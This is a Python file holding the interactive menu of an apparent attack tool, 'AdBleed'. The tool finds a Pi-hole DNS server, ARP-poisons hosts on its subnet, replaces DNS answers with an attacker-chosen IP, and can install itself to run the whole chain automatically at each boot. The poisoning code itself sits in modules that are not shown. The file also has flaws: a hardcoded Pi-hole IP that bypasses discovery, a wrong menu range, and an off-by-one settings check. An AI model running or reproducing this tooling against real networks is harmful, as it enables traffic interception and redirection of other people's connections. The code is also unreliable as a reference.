from scapy.all import *
from dns import Dns
from arp import Arp
from discovery import Discovery
from configuration import *

from RepeatedTimer import RepeatedTimer

class CLI:
    mainText = "Enter the number of the method you want to use:\n\
        1. Pi-hole discovery\n\
        2. ARP Poisoning\n\
        3. DNS Poisoning\n\
        4. Set-up automatic attack\n\
        5. Exit\n"

    conf = Configuration()
    disc = Discovery(conf.getNumberOfHosts(), conf.getSimilarResponses())
    dns = None
    arp = Arp()
    PiIP = ""
    ARPresult = False
    thread = None


    def mainCLI(self):
        while True:
            inp = input(self.mainText)
            if inp.lower().strip() == "1":  # Discovery
                self.discoveryCLI()
            elif inp.lower().strip() == "2":  # ARP Poisoning
                self.ARPCLI()
            elif inp.lower().strip() == "3":  # DNS Poisoning
                self.DNSCLI()
            elif inp.lower().strip() == "4":  # Set-up automatic attack
                self.automaticCLI()
    # Remove the option to change settings in CLI, see issue #2
    #        elif inp.lower().strip() == "5":  # Change settings
    #            self.settingsCLI()
            elif inp.lower().strip() == "5":  # Exit
                if self.thread is not None:
                    self.thread.stop()
                sys.exit()
            else:  # Error
                print("Please only enter a number 1-6\n")


    # =========================== Discovery ==============================

    def discoveryCLI(self):
        print("You are about to search for the Pi-hole with settings: ")
        print("   DnsQueryTimeout:  {} ms".format(self.conf.getDNSQueryTimeout()))
        print("   SimilarResp:      {}%".format(self.conf.getSimilarResponses()))
        print("   NumberOfHosts:    {}".format(self.conf.getNumberOfHosts()))
        print("   DNSServer:        {}".format(self.conf.getDNSsetting()))
        inp = input("Do you want to continue? (Y/n): ")

        if inp.lower().strip() == "y" or inp.lower().strip() == "yes" or len(inp.strip()) == 0:
            print("\n")
            self.PiIP = self.disc.getPi(self.conf.getDNSQueryTimeout(), self.conf.getDNSsetting())
            if not self.PiIP == None:
                print("Pi-hole was found at " + self.PiIP + "\nYou can continue with ARP Poisoning")
            else:
                print("No Pi-hole was found")
            return
        elif inp.lower().strip() == "n" or inp.lower().strip() == "no":
            return
        else:
            print("Invalid answer, please answer Y or N\n")
            self.discoveryCLI()
            return


    # ================================= ARP ====================================

    # For multi-threading
    def ARPPoisoning(self, setting):
        if len(setting) == 2:
            self.arp.poison_all(self.conf.getDNSsetting(), self.PiIP, self.arp.get_dns_mac(self.PiIP), False)
        else:
            self.arp.poison_all(self.conf.getARPtarget(), self.PiIP, self.arp.get_dns_mac(self.PiIP), False)


    def ARPCLI(self):
        self.PiIP = '192.168.0.10'
        if self.PiIP == "" or self.PiIP is None:
            print("IP of the Pi-hole was not set, please run Discovery first.")
            return
        print("You are about to initiate ARP poisoning with settings: ")
        setting = '{}'.format(self.conf.getARPtarget())
        if len(setting) == 2:
            print("   ARPtargets: " + self.conf.getDNSsetting())
        else:
            print("   ARPtargets: " + setting)

        print("   ARPdelay:  {} sec".format(self.conf.getARPdelay()))

        inp = input("Do you want to continue? (Y/n): ")

        if inp.lower().strip() == "y" or inp.lower().strip() == "yes" or len(inp.strip()) == 0:

            # ARP poisoning, initial call

            # If target is all hosts on DNS server's subnet
            if len(setting) == 2:
                print("Performing poisoning on " + self.conf.getDNSsetting())
                if self.arp.poison_all(self.conf.getDNSsetting(), self.PiIP, self.arp.get_dns_mac(self.PiIP), True):
                    self.ARPresult = True

            # Otherwise
            else:
                print("Performing poisoning on " + self.conf.getARPtarget())
                if self.arp.poison_all(self.conf.getARPtarget(), self.PiIP, self.arp.get_dns_mac(self.PiIP), True):
                    self.ARPresult = True

            if self.ARPresult:
                print("Pi-hole was successfully poisoned")
                # ARP poisoning, threading
                self.thread = RepeatedTimer(self.conf.getARPdelay(), self.ARPPoisoning, setting)
                self.thread.start()
                # TODO: Find a way to stop the thread when leaving app
                return
            else:
                print("Poisoning was not successful. Please try again.")
                return
        elif inp.lower().strip() == "n" or inp.lower().strip() == "no":
            return
        else:
            print("Invalid answer, please answer Y or N\n")
            self.ARPCLI()
            return


    # ================================= DNS ===================================

    def DNSCLI(self):
        if not self.ARPresult:
            print("ARP Poisoning was not completed successfully, please do this first.")
            return
        print("You are about to replace DNS responses of the Pi-hole with settings: ")
        print("   PoisonType:      {}".format(self.conf.getPoisonType()))
        print("   ReplaceIP:       {}".format(self.conf.getReplaceIP()))
        print("   SpoofingTimeout: {}".format(self.conf.getSpoofingTimeout()))
        inp = input("Do you want to continue? (Y/n): ")

        if inp.lower().strip() == "y" or inp.lower().strip() == "yes" or len(inp.strip()) == 0:
            # Ask if we should run in verbose mode
            verbose = input("Do you want to run in verbose mode? (Y/n): ")
            if verbose.lower().strip() == "y" or verbose.lower().strip() == "yes" or len(verbose.strip()) == 0:
                self.dns = Dns(self.PiIP, self.conf.getReplaceIP(), self.conf.getPoisonType(), True)
            else:
                self.dns = Dns(self.PiIP, self.conf.getReplaceIP(), self.conf.getPoisonType(), False)
            print("\n")
            # Start spoofing
            self.dns.spoofer(self.conf.getSpoofingTimeout())
        elif inp.lower().strip() == "n" or inp.lower().strip() == "no":
            return
        else:
            print("Invalid answer, please answer Y or N\n")
            self.DNSCLI()
            return


    # ============================== Automatic ===================================

    def automaticCLI(self):
        print("You are about to install AdBleed automatic mode for the next reboot.\n\
    This will automatically run the discovery, ARP poisoning and DNS poisoning with the settings in AdBleed.conf.")
        inp = input("Do you want to continue? (Y/n): ")
        if inp.lower().strip() == "y" or inp.lower().strip() == "yes" or len(inp.strip()) == 0:
            print("Installing...")
            # Execute commands to install service
            print("Done. AdBleed will be started automatically in the background next boot time.\n\
    To change the settings, rerun this and reboot. To stop AdBleed if it runs in the background:\n\
        sudo service AdBleed stop\n")
        elif inp.lower().strip() == "n" or inp.lower().strip() == "no":
            return
        else:
            print("Invalid answer, please answer Y or N\n")
            self.automaticCLI()
            return


    # =============================== Settings ==============================

    def settingsCLI(self):
        print("The settings are currently set as follows:")
        print("1    Discovery: DnsQueryTimeout  ({} ms)".format(self.conf.getDNSQueryTimeout()))
        print("2    Discovery: SimilarResp      ({}%)".format(self.conf.getSimilarResponses()))
        print("3    Discovery: NumberOfHosts    ({})".format(self.conf.getNumberOfHosts()))
        print("4    Discovery: DNSServer        ({})".format(self.conf.getDNSsetting()))
        print("5    Poisoning: PoisonType       ({})".format(self.conf.getPoisonType()))
        print("6    Poisoning: ReplaceIP        ({})".format(self.conf.getReplaceIP()))
        inp = input(
            "\nPlease refer to AdBleed.conf for explanation of the variables. To change a value, enter its number: ")
        var = int(inp)
        if not (int(inp) > 0 and int(inp) < 6):
            print("No valid input, returning to main menu")
            return
        else:
            val = input("To what value do you want to change this value: ")
            if var == 1:
                self.conf.setDNSQueryTimeout(val)
            elif var == 2:
                self.conf.setSimilarResponses(val)
            elif var == 3:
                self.conf.setNumberOfHosts(val)
            elif var == 4:
                self.conf.setDNSsetting(val)
            elif var == 5:
                self.conf.setPoisonType(val)
            elif var == 6:
                self.conf.setReplaceIP(val)
            print("The setting is now set to " + val + "!")
    pass
